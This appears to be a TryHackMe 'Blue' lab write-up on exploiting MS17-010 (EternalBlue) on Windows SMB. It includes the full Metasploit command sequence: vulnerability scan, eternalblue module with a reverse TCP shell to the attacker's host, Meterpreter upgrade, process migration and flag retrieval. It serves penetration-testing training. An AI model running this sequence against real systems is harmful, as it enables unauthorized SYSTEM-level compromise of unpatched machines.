# TryHackMe: Blue - EternalBlue Exploitation Write-up

**Room:** [Blue](https://tryhackme.com/room/blue)  
**Difficulty:** Easy  
**Focus:** Windows SMB Exploitation (MS17-010 / EternalBlue)

## Overview

The Blue room focuses on exploiting the infamous EternalBlue vulnerability (MS17-010) in Windows SMB services. This vulnerability was used in the WannaCry ransomware attack and remains a critical security lesson for understanding legacy system vulnerabilities.

## Reconnaissance

## Port Scanning & Vulnerability Detection

Initial reconnaissance was performed using Nmap with vulnerability scripts to identify open ports and potential vulnerabilities:



`nmap -sV -vv --script vuln TARGET_IP`

This comprehensive scan revealed:

- SMB services running on the target
    
- Windows operating system
    
- **Critical vulnerability: MS17-010 (EternalBlue)**
    

The vulnerability scan confirmed the target was exploitable via the EternalBlue vulnerability.

## Exploitation

## Metasploit Setup

Launched Metasploit Framework:



`msfconsole`

Selected the EternalBlue exploit module:



`use exploit/windows/smb/ms17_010_eternalblue`

Configured the exploit settings:



`set RHOSTS [TARGET_IP]`



`set PAYLOAD windows/x64/shell/reverse_tcp`



`set LHOST [MY_IP]`



`show options`

## Challenges Encountered

**Challenge 1: Exploit Instability**

The initial exploitation attempts failed multiple times. The exploit would run but not establish a stable connection:



`exploit`

Result: Connection failed or immediately dropped.

**Solution:** Restarted the target machine multiple times until the exploit successfully executed.

**Challenge 2: Converting Shell to Meterpreter**

After gaining initial shell access, I needed to upgrade to a Meterpreter session for better functionality.

Background the current session:



`CTRL + Z`

Use the shell to Meterpreter upgrade module:



`use post/multi/manage/shell_to_meterpreter`

Configure the module:



`show options`



`set SESSION [session_number]`



`set LHOST [MY_IP]`



`run`

**Problem:** The Meterpreter session kept dropping unexpectedly without warning. Multiple attempts resulted in disconnections.

**Challenge 3: Session Stability Issues**

Even after successfully converting to Meterpreter, the session would randomly disconnect. This required:

- Multiple target machine restarts
    
- Adjusting timing between attempts
    
- Patience and persistence
    

**Challenge 4: Process Migration Crashes**

When attempting to manually migrate to a more stable process, the target machine crashed multiple times.

Check running processes:



`ps`

Attempted migration:



`migrate [PID]`

Result: Target machine crash.

**Lessons learned:**

- Avoid system-critical processes (like `lsass.exe`, `csrss.exe`)
    
- Target user-level processes like `explorer.exe`
    
- Some processes are inherently unstable on exploited systems
    

## Final Solution: Timing & Persistence

After numerous attempts, target restarts, and timing adjustments, I finally achieved a stable Meterpreter session that remained active long enough for flag retrieval.

## Post-Exploitation

Once the stable Meterpreter session was finally established, flag retrieval became straightforward.

## Verify Access Level



`sysinfo`



`getuid`

Confirmed: **NT AUTHORITY\SYSTEM** - highest privilege level on Windows.

## Flag Retrieval

Search for flags:



`search -f flag*.txt`

Navigate to directories:



`cd [directory]`



`ls`

View flag contents:



`cat flag.txt`

All three flags were located and retrieved quickly using these commands.

## Lessons Learned

1. **Exploit Reliability:** Real-world exploits are not always "push-button" solutions. Stability issues are common, especially with memory corruption exploits like EternalBlue. Persistence and troubleshooting are essential.
    
2. **Shell to Meterpreter Conversion:** The `post/multi/manage/shell_to_meterpreter` module is invaluable for upgrading basic shells, but can be unstable on compromised systems. Multiple attempts may be necessary.
    
3. **Target Instability:** The room realistically simulated how exploited systems can be fragile. Multiple crashes occurred during process migration and session upgrades, teaching the importance of:
    
    - Choosing stable processes for migration
        
    - Having backup plans when sessions drop
        
    - Understanding that not every exploit attempt succeeds
        
4. **Metasploit Post-Exploitation Modules:** Understanding Metasploit's post-exploitation modules (like shell_to_meterpreter) expands capabilities beyond initial exploitation.
    
5. **Persistence Matters:** The most valuable lesson was not giving up. Cybersecurity challenges often require multiple attempts, creative troubleshooting, and patience.
    

## Technical Details

**Vulnerability:** MS17-010 (EternalBlue)  
**CVE:** CVE-2017-0144  
**Attack Vector:** SMB v1 remote code execution  
**Initial Payload:** windows/x64/shell/reverse_tcp  
**Upgraded to:** Meterpreter via post/multi/manage/shell_to_meterpreter  
**Access Gained:** SYSTEM-level privileges

## Conclusion

While the Blue room is classified as "Easy," it provided invaluable real-world experience dealing with exploit instability and system crashes. The challenge wasn't merely executing the exploit, but troubleshooting when things didn't work as expected - a crucial skill in penetration testing.

**Key Achievements:**

- Successfully exploited MS17-010 (EternalBlue) vulnerability
    
- Gained SYSTEM-level access on Windows target
    
- Successfully upgraded shell to Meterpreter despite stability issues
    
- Retrieved all flags despite multiple technical setbacks
    
- Developed critical troubleshooting and persistence skills
    

This experience reinforced that cybersecurity is as much about problem-solving and persistence as it is about technical knowledge. Real penetration testing scenarios rarely work perfectly on the first attempt.